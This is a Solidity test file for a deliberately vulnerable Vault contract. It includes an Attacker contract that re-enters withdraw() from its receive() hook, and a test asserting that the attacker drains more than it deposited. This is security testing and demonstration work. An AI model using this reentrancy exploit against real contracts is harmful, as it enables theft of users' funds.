// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../contracts/test/Vault.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address who) external;
}

/// @notice Smoke tests for the deliberately vulnerable Vault.
/// No forge-std dependency: uses plain assert() and a minimal
/// cheatcode interface, so `forge test` works in this bare repo.
contract VaultTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Vault vault;

    function setUp() public {
        vault = new Vault();
        vm.deal(address(this), 10 ether);
    }

    receive() external payable {}

    function testDepositAndWithdraw() public {
        vault.deposit{value: 1 ether}();
        assert(vault.balances(address(this)) == 1 ether);
        vault.withdraw();
        assert(vault.balances(address(this)) == 0);
        assert(address(this).balance == 10 ether);
    }
}

contract Attacker {
    Vault public vault;
    uint256 public reentries;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentries < 3) {
            reentries++;
            vault.withdraw();
        }
    }
}

/// @notice This test PASSES while the bug exists: the attacker
/// deposits 1 ether and walks away with more than 1 ether,
/// draining the victim's funds. If Vault is fixed, it FAILS.
contract VaultReentrancyTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        // Victim funds the vault with 5 ether.
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        // Attacker gets 1 ether of its own.
        attacker = new Attacker(vault);
        vm.deal(address(attacker), 1 ether);
    }

    receive() external payable {}

    function testReentrancyDrainsVault() public {
        uint256 attackerBefore = address(attacker).balance;
        assert(attackerBefore == 1 ether);
        attacker.attack{value: 0}();
        // Attacker deposited 1 ether but withdrew much more.
        assert(address(attacker).balance > 1 ether);
        assert(address(attacker).balance > attackerBefore);
    }
}
